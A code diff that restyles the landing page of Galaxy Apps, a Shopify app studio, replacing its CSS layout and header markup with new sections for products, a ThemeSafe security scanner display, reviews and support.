-      .app-icon.teal {
+      .chip-clean {
         background: var(--accent-soft);
         color: var(--accent-strong);
       }
-      .app-icon.blue {
-        background: #e4edfb;
-        color: #2f5fb3;
-      }
-      .app-icon.amber {
-        background: #fdf0da;
-        color: #b97a0e;
-      }
-      @media (prefers-color-scheme: dark) {
-        .app-icon.blue {
-          background: #16283f;
-          color: #7fb0f5;
-        }
-        .app-icon.amber {
-          background: #2e2410;
-          color: #f2c66d;
-        }
-      }
-      .app-card h3 {
-        margin: 0 0 4px;
-        font-size: 1.18rem;
-        font-weight: 700;
-        letter-spacing: -0.01em;
-      }
-      .app-card .tagline {
-        color: var(--muted);
-        font-size: 0.93rem;
-        margin: 0 0 16px;
-      }
-      .app-meta {
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        flex-wrap: wrap;
-        font-size: 0.83rem;
-        color: var(--ink-2);
-        margin-bottom: 18px;
-      }
-      .app-meta .stars {
-        font-size: 0.85rem;
-      }
-      .app-meta .sep {
-        width: 3px;
-        height: 3px;
-        border-radius: 50%;
-        background: var(--muted);
-      }
-      .feat {
-        list-style: none;
-        margin: 0 0 24px;
-        padding: 0;
-        display: grid;
-        gap: 9px;
-        font-size: 0.9rem;
-        color: var(--ink-2);
-      }
-      .feat li {
-        display: flex;
-        gap: 9px;
-      }
-      .feat li::before {
-        content: "";
-        flex: none;
-        width: 17px;
-        height: 17px;
-        margin-top: 3px;
-        border-radius: 50%;
-        background: var(--ok-soft)
-          url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2315936b' stroke-width='3.4' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M20 6L9 17l-5-5'/%3E%3C/svg%3E")
-          center / 10px no-repeat;
-      }
-      .app-card .card-foot {
-        margin-top: auto;
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        gap: 12px;
-        border-top: 1px solid var(--line);
-        padding-top: 18px;
-      }
-      .price-note {
-        font-size: 0.85rem;
-        color: var(--muted);
-      }
-      .price-note b {
-        color: var(--ink);
-        font-size: 1rem;
-      }
-      .install-link {
-        font-weight: 600;
-        font-size: 0.9rem;
-        color: var(--accent-strong);
-        text-decoration: none;
-        white-space: nowrap;
-      }
-      .install-link:hover {
-        text-decoration: underline;
-      }
 
-      /* ---------- spotlight ---------- */
-      .spotlight-band {
-        background: var(--navy);
-        color: var(--navy-ink);
-      }
-      .spotlight-band .label {
-        color: #2dd4bf;
-      }
-      .spotlight-band .section-head p {
-        color: var(--navy-muted);
-      }
-      .steps {
-        display: grid;
-        grid-template-columns: repeat(3, 1fr);
-        gap: 14px;
-        margin-bottom: 40px;
-      }
-      .step-btn {
-        text-align: left;
-        font-family: var(--font);
-        cursor: pointer;
-        background: rgba(255, 255, 255, 0.03);
-        border: 1px solid var(--navy-line);
-        border-radius: 14px;
-        padding: 20px;
-        color: var(--navy-ink);
-        transition: border-color 0.2s ease, background 0.2s ease;
-      }
-      .step-btn:hover {
-        border-color: rgba(45, 212, 191, 0.5);
-      }
-      .step-btn.on {
-        border-color: #2dd4bf;
-        background: rgba(45, 212, 191, 0.08);
-      }
-      .step-btn .num {
-        font-family: var(--mono);
-        font-size: 0.75rem;
-        color: #2dd4bf;
-        font-weight: 600;
-      }
-      .step-btn h3 {
-        margin: 8px 0 6px;
-        font-size: 1.02rem;
-      }
-      .step-btn p {
-        margin: 0;
-        font-size: 0.87rem;
-        color: var(--navy-muted);
-        line-height: 1.55;
-      }
-      .spot-grid {
-        display: grid;
-        grid-template-columns: 1.05fr 1fr;
-        gap: 40px;
-        align-items: start;
-      }
-      .code-panel {
-        background: #0a1526;
-        border: 1px solid var(--navy-line);
-        border-radius: 14px;
-        overflow: hidden;
-      }
-      .code-panel .cp-bar {
-        padding: 10px 14px;
-        border-bottom: 1px solid var(--navy-line);
-        font-family: var(--mono);
-        font-size: 0.72rem;
-        color: #8ea6c4;
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        gap: 10px;
-      }
-      .code-panel pre {
-        margin: 0;
+      .scanner-code-view {
+        margin: 12px 16px;
         padding: 16px;
-        font-family: var(--mono);
-        font-size: 0.78rem;
-        line-height: 1.75;
-        color: #c9d9ec;
-        white-space: pre-wrap;
-        overflow-wrap: anywhere;
-      }
-      .code-panel .cm {
-        color: #5d7595;
-      }
-      .code-panel .bad {
-        background: rgba(224, 93, 93, 0.14);
-        display: block;
-        margin: 0 -16px;
-        padding: 0 16px;
-        border-left: 3px solid #e05d5d;
-      }
-      .code-panel .kw {
-        color: #7dd3fc;
-      }
-      .code-panel .str {
-        color: #f2c66d;
-      }
-      .verdict {
-        border-top: 1px solid var(--navy-line);
-        padding: 14px 16px;
-        display: flex;
-        gap: 12px;
-        align-items: flex-start;
-      }
-      .verdict p {
-        margin: 0;
-        font-size: 0.85rem;
-        color: #b9cde4;
-      }
-      .verdict b {
-        color: #ff9c9c;
-      }
-      .spot-copy h3 {
-        font-size: 1.35rem;
-        margin: 0 0 12px;
-        letter-spacing: -0.01em;
-      }
-      .spot-copy p {
-        color: var(--navy-muted);
-        margin: 0 0 16px;
-      }
-      .spot-copy .feat li {
-        color: #c9d9ec;
-      }
-      .spot-copy .feat li::before {
-        background-color: rgba(45, 212, 191, 0.16);
-        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%232dd4bf' stroke-width='3.4' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M20 6L9 17l-5-5'/%3E%3C/svg%3E");
-      }
-      .plans {
-        display: grid;
-        grid-template-columns: repeat(3, 1fr);
-        gap: 12px;
-        margin-top: 22px;
-      }
-      .plan {
-        border: 1px solid var(--navy-line);
-        border-radius: 12px;
-        padding: 16px;
-        background: rgba(255, 255, 255, 0.03);
-      }
-      .plan.mid {
-        border-color: rgba(45, 212, 191, 0.55);
-      }
-      .plan h4 {
-        margin: 0 0 2px;
-        font-size: 0.9rem;
-      }
-      .plan .amt {
-        font-size: 1.3rem;
-        font-weight: 800;
-      }
-      .plan .amt small {
-        font-size: 0.75rem;
-        font-weight: 500;
-        color: var(--navy-muted);
-      }
-      .plan ul {
-        list-style: none;
-        margin: 10px 0 0;
-        padding: 0;
-        font-size: 0.8rem;
-        color: var(--navy-muted);
-        display: grid;
-        gap: 6px;
-      }
-
-      /* ---------- reviews ---------- */
-      .reviews {
-        display: grid;
-        grid-template-columns: repeat(3, 1fr);
-        gap: 20px;
-      }
-      .review-card {
-        background: var(--surface);
+        border-radius: 14px;
+        background: var(--bg);
         border: 1px solid var(--line);
-        border-radius: var(--radius);
-        padding: 26px;
-        display: flex;
-        flex-direction: column;
+        font-family: var(--mono);
+        font-size: 0.76rem;
+        line-height: 1.7;
+        color: var(--ink-2);
+        overflow-x: auto;
       }
-      .review-card-top {
+      .code-line {
+        display: grid;
+        grid-template-columns: 28px 1fr;
+        gap: 10px;
+        padding: 2px 8px;
+        border-radius: 6px;
+      }
+      .code-line .ln {
+        color: var(--muted);
+        user-select: none;
+      }
+      .code-line.flagged-risk {
+        background: var(--danger-soft);
+        border-left: 2px solid var(--danger);
+        color: var(--ink);
+      }
+      .code-line.flagged-warn {
+        background: var(--warn-soft);
+        border-left: 2px solid var(--warn);
+        color: var(--ink);
+      }
+      .code-line.flagged-clean {
+        background: var(--accent-soft);
+        border-left: 2px solid var(--accent);
+        color: var(--ink);
+      }
+
+      .scanner-verdict {
+        margin: 0 16px 16px;
+        padding: 14px 16px;
+        border-radius: 14px;
+        background: var(--accent-soft);
+        border: 1px solid var(--accent-border);
+      }
+      .scanner-verdict-head {
         display: flex;
         align-items: center;
         justify-content: space-between;
         gap: 8px;
+        font-size: 0.78rem;
+        font-weight: 700;
+        color: var(--accent-strong);
+        margin-bottom: 4px;
       }
-      .verified-pill {
-        font-size: 0.72rem;
-        font-weight: 600;
-        color: var(--ok);
-        background: var(--ok-soft);
-        padding: 3px 9px;
-        border-radius: 999px;
-      }
-      .review-card blockquote {
-        margin: 14px 0 20px;
-        font-size: 0.98rem;
+      .scanner-verdict p {
+        margin: 0;
+        font-size: 0.82rem;
         color: var(--ink-2);
-        line-height: 1.65;
+        line-height: 1.55;
       }
-      .review-who {
-        margin-top: auto;
+
+      /* ==========================================================================
+         SECTION 2: VERIFIED TELEMETRY LEDGER (Directly below Hero, never inside)
+         ========================================================================== */
+      .ledger-section {
+        border-top: 1px solid var(--line);
+        border-bottom: 1px solid var(--line);
+        background: var(--bg-elevated);
+      }
+      .ledger-grid {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+      }
+      .ledger-cell {
+        padding: 28px 24px;
+        border-right: 1px solid var(--line);
+      }
+      .ledger-cell:last-child {
+        border-right: 0;
+      }
+      .ledger-cell strong {
+        display: block;
+        font-family: var(--display);
+        font-size: 1.85rem;
+        font-weight: 800;
+        letter-spacing: -0.02em;
+        color: var(--ink);
+        line-height: 1.1;
+        margin-bottom: 4px;
+      }
+      .ledger-cell span {
+        font-size: 0.86rem;
+        color: var(--muted);
+      }
+
+      /* ==========================================================================
+         SECTION 3: ASYMMETRIC BENTO PRODUCT SUITE (3 products = 3 cells, 7 + 5 split)
+         ========================================================================== */
+      .section-space {
+        padding: 112px 0;
+      }
+      .section-intro {
+        max-width: 62ch;
+        margin-bottom: 52px;
+      }
+      .section-intro h2 {
+        font-family: var(--display);
+        font-size: clamp(2rem, 3.4vw, 2.85rem);
+        font-weight: 800;
+        letter-spacing: -0.025em;
+        line-height: 1.1;
+        margin: 0 0 14px;
+        text-wrap: balance;
+      }
+      .section-intro p {
+        margin: 0;
+        font-size: 1.05rem;
+        color: var(--ink-2);
+      }
+
+      .bento-suite {
+        display: grid;
+        grid-template-columns: repeat(12, 1fr);
+        gap: 22px;
+        align-items: stretch;
+      }
+      .bento-flagship {
+        grid-column: span 7;
+        grid-row: span 2;
+      }
+      .bento-secondary {
+        grid-column: span 5;
+      }
+      .bento-flagship .bezel-core {
+        background:
+          radial-gradient(600px 280px at 90% 0%, var(--accent-soft), transparent 70%),
+          var(--core-bg);
+        padding: 36px;
+        display: flex;
+        flex-direction: column;
+      }
+      .bento-secondary .bezel-core {
+        padding: 30px;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .app-top-row {
         display: flex;
         align-items: center;
+        justify-content: space-between;
         gap: 12px;
+        margin-bottom: 22px;
       }
-      .avatar {
-        width: 42px;
-        height: 42px;
-        border-radius: 50%;
+      .app-glyph {
+        width: 48px;
+        height: 48px;
+        border-radius: 14px;
+        background: var(--accent-soft);
+        border: 1px solid var(--accent-border);
+        color: var(--accent-strong);
         display: grid;
         place-items: center;
-        font-weight: 700;
-        font-size: 0.85rem;
-        color: #fff;
-        flex: none;
       }
-      .review-who b {
+      .app-rating-badge {
+        font-family: var(--mono);
+        font-size: 0.76rem;
+        font-weight: 600;
+        padding: 5px 12px;
+        border-radius: 999px;
+        background: var(--shell-bg);
+        border: 1px solid var(--line);
+        color: var(--ink);
+      }
+      .bento-suite h3 {
+        font-family: var(--display);
+        font-size: 1.55rem;
+        font-weight: 700;
+        letter-spacing: -0.02em;
+        margin: 0 0 8px;
+      }
+      .bento-flagship h3 {
+        font-size: 1.95rem;
+      }
+      .app-summary {
+        color: var(--ink-2);
+        font-size: 0.98rem;
+        margin: 0 0 22px;
+        max-width: 54ch;
+      }
+
+      /* 2-col capability tiles inside flagship bento (avoids long generic bullet lists) */
+      .flagship-capabilities {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 12px;
+        margin-bottom: 28px;
+      }
+      .cap-tile {
+        padding: 16px;
+        border-radius: 16px;
+        background: var(--core-bg-alt);
+        border: 1px solid var(--line);
+      }
+      .cap-tile strong {
+        display: block;
+        font-size: 0.9rem;
+        margin-bottom: 4px;
+        color: var(--ink);
+      }
+      .cap-tile span {
+        font-size: 0.83rem;
+        color: var(--muted);
+        line-height: 1.5;
+      }
+
+      .compact-specs {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 8px;
+        margin-bottom: 24px;
+      }
+      .spec-pill {
+        font-size: 0.8rem;
+        font-weight: 500;
+        padding: 6px 12px;
+        border-radius: 999px;
+        background: var(--core-bg-alt);
+        border: 1px solid var(--line);
+        color: var(--ink-2);
+      }
+
+      .app-footer-bar {
+        margin-top: auto;
+        padding-top: 20px;
+        border-top: 1px solid var(--line);
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 14px;
+        flex-wrap: wrap;
+      }
+      .price-tag {
+        font-size: 0.86rem;
+        color: var(--muted);
+      }
+      .price-tag strong {
+        color: var(--ink);
+        font-size: 1rem;
+      }
+      .text-action {
+        font-weight: 600;
+        font-size: 0.9rem;
+        color: var(--accent-strong);
+        text-decoration: none;
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        transition: gap 0.25s var(--spring);
+      }
+      .text-action:hover {
+        gap: 10px;
+      }
+
+      /* ==========================================================================
+         SECTION 4: EDITORIAL SPLIT WORKBENCH (ThemeSafe Security Deep Dive)
+         ========================================================================== */
+      .workbench-section {
+        padding: 112px 0;
+        border-top: 1px solid var(--line);
+        background: var(--bg-elevated);
+      }
+      .workbench-grid {
+        display: grid;
+        grid-template-columns: 1fr 1.12fr;
+        gap: 52px;
+        align-items: start;
+      }
+      .pipeline-list {
+        display: grid;
+        gap: 12px;
+        margin: 32px 0;
+      }
+      .pipeline-btn {
+        width: 100%;
+        text-align: left;
+        font-family: var(--sans);
+        padding: 20px 22px;
+        border-radius: 18px;
+        background: var(--core-bg);
+        border: 1px solid var(--line);
+        color: var(--ink);
+        cursor: pointer;
+        transition:
+          border-color 0.3s var(--spring),
+          background-color 0.3s var(--spring),
+          transform 0.2s var(--spring);
+      }
+      .pipeline-btn:hover {
+        border-color: var(--accent-border);
+      }
+      .pipeline-btn.active {
+        border-color: var(--accent);
+        background: var(--accent-soft);
+      }
+      .pipeline-btn strong {
+        display: block;
+        font-family: var(--display);
+        font-size: 1.08rem;
+        margin-bottom: 4px;
+      }
+      .pipeline-btn span {
+        font-size: 0.88rem;
+        color: var(--ink-2);
+        line-height: 1.55;
+      }
+
+      /* Right side of Workbench: Live Code Diff + Tier Matrix */
+      .diff-header {
+        padding: 16px 20px;
+        border-bottom: 1px solid var(--line);
+        background: var(--core-bg-alt);
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 12px;
+        font-family: var(--mono);
+        font-size: 0.75rem;
+      }
+      .diff-body {
+        padding: 22px;
+      }
+      .diff-code {
+        margin: 0 0 18px;
+        padding: 16px;
+        border-radius: 14px;
+        background: var(--bg);
+        border: 1px solid var(--line);
+        font-family: var(--mono);
+        font-size: 0.77rem;
+        line-height: 1.75;
+        color: var(--ink-2);
+        white-space: pre-wrap;
+        overflow-wrap: anywhere;
+      }
+      .diff-removed {
+        display: block;
+        background: var(--danger-soft);
+        color: var(--danger);
+        padding: 2px 10px;
+        margin: 2px -10px;
+        border-left: 2px solid var(--danger);
+      }
+      .diff-added {
+        display: block;
+        background: var(--accent-soft);
+        color: var(--accent-strong);
+        padding: 2px 10px;
+        margin: 2px -10px;
+        border-left: 2px solid var(--accent);
+      }
+      .workbench-note {
+        padding: 16px 18px;
+        border-radius: 14px;
+        background: var(--core-bg-alt);
+        border: 1px solid var(--line);
+        margin-bottom: 20px;
+      }
+      .workbench-note strong {
+        display: block;
+        font-size: 0.92rem;
+        margin-bottom: 4px;
+        color: var(--ink);
+      }
+      .workbench-note p {
+        margin: 0;
+        font-size: 0.86rem;
+        color: var(--ink-2);
+      }
+
+      .tier-strip {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 10px;
+      }
+      .tier-box {
+        padding: 14px;
+        border-radius: 14px;
+        background: var(--core-bg-alt);
+        border: 1px solid var(--line);
+      }
+      .tier-box.featured {
+        border-color: var(--accent-border);
+        background: var(--accent-soft);
+      }
+      .tier-box small {
+        display: block;
+        font-size: 0.75rem;
+        font-weight: 600;
+        color: var(--muted);
+      }
+      .tier-box strong {
+        display: block;
+        font-family: var(--display);
+        font-size: 1.25rem;
+        margin: 2px 0 4px;
+      }
+      .tier-box span {
+        font-size: 0.76rem;
+        color: var(--ink-2);
+      }
+
+      /* ==========================================================================
+         SECTION 5: ASYMMETRIC MERCHANT PROOF WALL (1 Featured + 2 Stacked)
+         ========================================================================== */
+      .reviews-layout {
+        display: grid;
+        grid-template-columns: 1.15fr 1fr;
+        gap: 22px;
+        align-items: stretch;
+      }
+      .review-featured .bezel-core {
+        padding: 40px;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+      }
+      .review-stack {
+        display: grid;
+        gap: 22px;
+      }
+      .review-stack .bezel-core {
+        padding: 28px;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+      }
+      .review-top {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 12px;
+        margin-bottom: 18px;
+      }
+      .star-row {
+        color: var(--accent-strong);
+        font-size: 0.95rem;
+        letter-spacing: 2px;
+      }
+      .verified-tag {
+        font-family: var(--mono);
+        font-size: 0.7rem;
+        font-weight: 600;
+        color: var(--accent-strong);
+        background: var(--accent-soft);
+        padding: 4px 10px;
+        border-radius: 999px;
+      }
+      .review-quote {
+        margin: 0 0 24px;
+        font-size: 1.02rem;
+        color: var(--ink);
+        line-height: 1.6;
+      }
+      .review-featured .review-quote {
+        font-family: var(--display);
+        font-size: clamp(1.35rem, 2.2vw, 1.7rem);
+        font-weight: 600;
+        line-height: 1.35;
+        letter-spacing: -0.015em;
+      }
+      .merchant-meta {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 12px;
+        padding-top: 16px;
+        border-top: 1px solid var(--line);
+      }
+      .merchant-meta strong {
         display: block;
         font-size: 0.92rem;
       }
-      .review-who span {
+      .merchant-meta span {
         font-size: 0.8rem;
         color: var(--muted);
       }
-      .reviews-foot {
-        margin-top: 26px;
-        font-size: 0.92rem;
-        color: var(--muted);
-      }
-      .reviews-foot a {
-        color: var(--accent-strong);
-        font-weight: 600;
-        text-decoration: none;
-      }
-      .reviews-foot a:hover {
-        text-decoration: underline;
-      }
 
-      /* ---------- about / support ---------- */
-      .about-grid {
+      /* ==========================================================================
+         SECTION 6: STUDIO MANIFESTO & SUPPORT ARCHITECTURE
+         ========================================================================== */
+      .studio-section {
+        padding: 112px 0;
+        border-top: 1px solid var(--line);
+      }
+      .studio-grid {
         display: grid;
-        grid-template-columns: 1.2fr 1fr;
-        gap: 48px;
+        grid-template-columns: 1.15fr 0.85fr;
+        gap: 56px;
         align-items: start;
       }
-      .about-grid h2 {
-        font-size: clamp(1.7rem, 3.2vw, 2.3rem);
+      .studio-copy h2 {
+        font-family: var(--display);
+        font-size: clamp(1.95rem, 3.2vw, 2.65rem);
         font-weight: 800;
-        letter-spacing: -0.02em;
-        line-height: 1.15;
+        letter-spacing: -0.025em;
+        line-height: 1.12;
+        margin: 0 0 20px;
+        text-wrap: balance;
+      }
+      .studio-copy p {
+        color: var(--ink-2);
+        font-size: 1.02rem;
         margin: 0 0 16px;
+        max-width: 60ch;
       }
-      .about-grid p {
-        color: var(--muted);
-        margin: 0 0 14px;
-      }
-      .about-grid p strong {
-        color: var(--ink);
-      }
-      .principles {
+      .studio-pillars {
         display: grid;
-        gap: 12px;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 16px;
+        margin-top: 28px;
       }
-      .principle {
-        background: var(--surface);
-        border: 1px solid var(--line);
-        border-radius: 14px;
-        padding: 18px 20px;
+      .pillar-item {
+        padding-top: 14px;
+        border-top: 1px solid var(--line);
       }
-      .principle b {
+      .pillar-item strong {
         display: block;
+        font-size: 0.94rem;
         margin-bottom: 4px;
-        font-size: 0.98rem;
       }
-      .principle span {
-        font-size: 0.9rem;
+      .pillar-item span {
+        font-size: 0.85rem;
         color: var(--muted);
-      }
-      .support-band {
-        background: var(--surface);
-        border: 1px solid var(--line);
-        border-radius: 22px;
-        padding: 40px;
-        display: flex;
-        align-items: center;
-        gap: 28px;
-        flex-wrap: wrap;
-        box-shadow: var(--shadow-md);
-      }
-      .support-band h2 {
-        margin: 0 0 6px;
-        font-size: 1.5rem;
-        letter-spacing: -0.01em;
-      }
-      .support-band p {
-        margin: 0;
-        color: var(--muted);
-        max-width: 34rem;
-      }
-      .support-band .btn {
-        margin-left: auto;
       }
 
-      /* ---------- footer ---------- */
-      footer {
-        border-top: 1px solid var(--line);
-        padding: 54px 0 40px;
-        margin-top: 84px;
-        background: var(--surface-2);
+      .support-card-inner {
+        padding: 36px;
       }
-      .foot-grid {
+      .support-card-inner h3 {
+        font-family: var(--display);
+        font-size: 1.5rem;
+        margin: 0 0 10px;
+      }
+      .support-card-inner p {
+        color: var(--ink-2);
+        font-size: 0.95rem;
+        margin: 0 0 24px;
+      }
+      .sla-list {
         display: grid;
-        grid-template-columns: 1.35fr 1fr 1fr 1.15fr;
-        gap: 32px;
+        gap: 10px;
+        margin-bottom: 28px;
+        padding: 16px;
+        border-radius: 16px;
+        background: var(--core-bg-alt);
+        border: 1px solid var(--line);
+        font-size: 0.85rem;
       }
-      .foot-grid h4 {
-        margin: 0 0 14px;
-        font-size: 0.82rem;
-        letter-spacing: 0.08em;
-        text-transform: uppercase;
+      .sla-row {
+        display: flex;
+        justify-content: space-between;
+        gap: 12px;
+      }
+      .sla-row span {
         color: var(--muted);
       }
-      .foot-grid ul {
+      .sla-row strong {
+        color: var(--ink);
+        font-family: var(--mono);
+        font-size: 0.8rem;
+      }
+
+      /* ==========================================================================
+         FOOTER
+         ========================================================================== */
+      .site-footer {
+        border-top: 1px solid var(--line);
+        background: var(--bg-elevated);
+        padding: 64px 0 44px;
+      }
+      .footer-grid {
+        display: grid;
+        grid-template-columns: 1.4fr 1fr 1fr 1.2fr;
+        gap: 36px;
+      }
+      .footer-col h4 {
+        margin: 0 0 14px;
+        font-family: var(--mono);
+        font-size: 0.74rem;
+        text-transform: uppercase;
+        letter-spacing: 0.12em;
+        color: var(--muted);
+      }
+      .footer-col ul {
         list-style: none;
         margin: 0;
         padding: 0;
         display: grid;
-        gap: 9px;
-        font-size: 0.91rem;
+        gap: 10px;
+        font-size: 0.9rem;
       }
-      .foot-grid a {
+      .footer-col a {
         text-decoration: none;
         color: var(--ink-2);
+        transition: color 0.2s var(--spring);
       }
-      .foot-grid a:hover {
+      .footer-col a:hover {
         color: var(--accent-strong);
       }
-      .foot-brand p {
+      .footer-brand p {
         color: var(--muted);
         font-size: 0.9rem;
-        max-width: 20rem;
+        max-width: 32ch;
+        margin: 14px 0 0;
       }
-      .foot-bottom {
-        margin-top: 40px;
-        padding-top: 22px;
+      .footer-bottom {
+        margin-top: 48px;
+        padding-top: 24px;
         border-top: 1px solid var(--line);
         display: flex;
         justify-content: space-between;
         flex-wrap: wrap;
-        gap: 8px 22px;
-        font-size: 0.83rem;
+        gap: 12px;
+        font-size: 0.82rem;
         color: var(--muted);
       }
 
-      /* ---------- responsive ---------- */
-      @media (max-width: 1020px) {
-        .hero {
-          grid-template-columns: 1fr;
-          gap: 64px;
-          padding: 56px 0 72px;
-        }
-        .products,
-        .reviews {
-          grid-template-columns: 1fr;
-          max-width: 560px;
-        }
-        .steps {
+      /* ==========================================================================
+         EXPLICIT MOBILE COLLAPSE (< 1024px and < 768px)
+         ========================================================================== */
+      @media (max-width: 1024px) {
+        .hero-grid,
+        .workbench-grid,
+        .reviews-layout,
+        .studio-grid {
           grid-template-columns: 1fr;
         }
-        .spot-grid,
-        .about-grid {
-          grid-template-columns: 1fr;
+        .bento-flagship,
+        .bento-secondary {
+          grid-column: span 12;
         }
-        .stats {
+        .ledger-grid {
           grid-template-columns: repeat(2, 1fr);
         }
-        .foot-grid {
-          grid-template-columns: 1fr 1fr;
+        .ledger-cell:nth-child(2) {
+          border-right: 0;
+        }
+        .ledger-cell:nth-child(1),
+        .ledger-cell:nth-child(2) {
+          border-bottom: 1px solid var(--line);
+        }
+        .footer-grid {
+          grid-template-columns: repeat(2, 1fr);
         }
       }
-      @media (max-width: 760px) {
-        .main-nav {
+
+      @media (max-width: 768px) {
+        .wrap {
+          padding: 0 18px;
+        }
+        .island-header {
+          padding: 0 12px;
+        }
+        .nav-links {
           display: none;
           position: absolute;
-          top: 72px;
-          left: 0;
-          right: 0;
+          top: 74px;
+          left: 12px;
+          right: 12px;
           flex-direction: column;
-          gap: 2px;
-          padding: 12px 16px 16px;
-          background: var(--surface);
-          border-bottom: 1px solid var(--line);
-          box-shadow: var(--shadow-md);
+          align-items: stretch;
+          padding: 14px;
+          border-radius: 24px;
+          background: var(--core-bg);
+          border: 1px solid var(--shell-border);
+          box-shadow: var(--shadow-ambient);
         }
-        .main-nav.open {
+        .nav-links.open {
           display: flex;
         }
-        .main-nav a {
-          padding: 11px 12px;
+        .nav-links a {
+          padding: 12px 16px;
         }
         .nav-toggle {
           display: inline-flex;
         }
-        .header-cta {
+        .nav-actions .btn-island {
           display: none;
         }
-        .dash-body {
+        .hero-section {
+          min-height: auto;
+          padding: 32px 0 56px;
+        }
+        .scanner-tabs,
+        .flagship-capabilities,
+        .tier-strip,
+        .studio-pillars,
+        .ledger-grid,
+        .footer-grid {
           grid-template-columns: 1fr;
         }
-        .dash-side {
-          display: none;
+        .ledger-cell {
+          border-right: 0;
+          border-bottom: 1px solid var(--line);
+          padding: 20px 16px;
         }
-        .float-1 {
-          right: 6px;
+        .ledger-cell:last-child {
+          border-bottom: 0;
         }
-        .float-2 {
-          display: none;
+        .section-space,
+        .workbench-section,
+        .studio-section {
+          padding: 72px 0;
         }
-        .plans {
-          grid-template-columns: 1fr;
-        }
-        .support-band {
-          padding: 28px;
-        }
-        .support-band .btn {
-          margin-left: 0;
-        }
-        .section {
-          padding: 60px 0;
-        }
-        .foot-grid {
-          grid-template-columns: 1fr;
+        .bento-flagship .bezel-core,
+        .bento-secondary .bezel-core,
+        .review-featured .bezel-core,
+        .support-card-inner {
+          padding: 24px;
         }
       }
     </style>
   </head>
   <body>
-    <!-- ================= HEADER ================= -->
-    <header class="site-header" id="siteHeader">
-      <div class="wrap header-in">
-        <a class="brand" href="#top" aria-label="Galaxy Apps home">
-          <svg class="mark" viewBox="0 0 36 36" aria-hidden="true">
-            <rect width="36" height="36" rx="9" fill="#0a1628" />
+    <a class="skip-link" href="#main-content">Skip to content</a>
+    <div class="nav-sentinel" id="navSentinel" aria-hidden="true"></div>
+
+    <!-- ================= FLOATING FLUID ISLAND HEADER ================= -->
+    <header class="island-header" id="islandHeader">
+      <div class="island-nav">
+        <a class="brand" href="#main-content" aria-label="Galaxy Apps home">
+          <svg class="brand-mark" viewBox="0 0 36 36" aria-hidden="true">
+            <rect width="36" height="36" rx="10" fill="#0a1628" />
             <path d="M18 6.5l2.5 6.3 6.3 2.5-6.3 2.5L18 24l-2.5-6.2-6.3-2.5 6.3-2.5z" fill="#2dd4bf" />
             <circle cx="27" cy="25.5" r="1.8" fill="#f5b544" />
             <circle cx="9" cy="9" r="1.2" fill="#e8f2fd" />
           </svg>
-          <span>Galaxy Apps<small>Shopify App Studio</small></span>
+          <span>Galaxy Apps</span>
         </a>
-        <button class="nav-toggle" id="navToggle" aria-label="Open menu" aria-expanded="false">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round">
-            <path d="M4 7h16M4 12h16M4 17h16" />
-          </svg>
-        </button>
-        <nav class="main-nav" id="mainNav" aria-label="Main">
+
+        <nav class="nav-links" id="mainNav" aria-label="Primary">
           <a href="#products">Products</a>
           <a href="#themesafe-security">ThemeSafe Security</a>
           <a href="#reviews">Reviews</a>
-          <a href="#about">About</a>
+          <a href="#about">Studio</a>
           <a href="privacy.html">Privacy</a>
           <a href="#support">Support</a>
         </nav>
-        <a class="btn btn-primary header-cta" href="https://apps.shopify.com/partners/susu5" target="_blank" rel="noopener">
-          View on Shopify App Store
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
-            <path d="M7 17L17 7M9 7h8v8" />
-          </svg>
-        </a>
+
+        <div class="nav-actions">
+          <button class="theme-btn" id="themeToggle" type="button" aria-label="Toggle color theme" title="Toggle light or dark mode">
+            <svg width="18" height="18" viewBox="0 0 256 256" fill="none" stroke="currentColor" stroke-width="18" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <circle cx="128" cy="128" r="56" />
+              <line x1="128" y1="40" x2="128" y2="16" />
+              <line x1="128" y1="240" x2="128" y2="216" />
+              <line x1="40" y1="128" x2="16" y2="128" />
+              <line x1="240" y1="128" x2="216" y2="128" />
+            </svg>
+          </button>
+          <a class="btn-island" href="https://apps.shopify.com/partners/susu5" target="_blank" rel="noopener">
+            <span>View on Shopify</span>
+            <span class="btn-pod" aria-hidden="true">
+              <svg width="14" height="14" viewBox="0 0 256 256" fill="none" stroke="currentColor" stroke-width="22" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="64" y1="192" x2="192" y2="64" />
+                <polyline points="88 64 192 64 192 168" />
+              </svg>
+            </span>
+          </a>
+          <button class="nav-toggle" id="navToggle" type="button" aria-label="Open menu" aria-expanded="false">
+            <svg width="18" height="18" viewBox="0 0 256 256" fill="none" stroke="currentColor" stroke-width="20" stroke-linecap="round">
+              <line x1="40" y1="80" x2="216" y2="80" />
+              <line x1="40" y1="128" x2="216" y2="128" />
+              <line x1="40" y1="176" x2="216" y2="176" />
+            </svg>
+          </button>
+        </div>
       </div>
     </header>
 
-    <main id="top">
-      <!-- ================= HERO ================= -->
-      <div class="hero-band">
-        <div class="wrap hero">
-          <div>
-            <span class="hero-badge">
-              <span class="dot"></span>
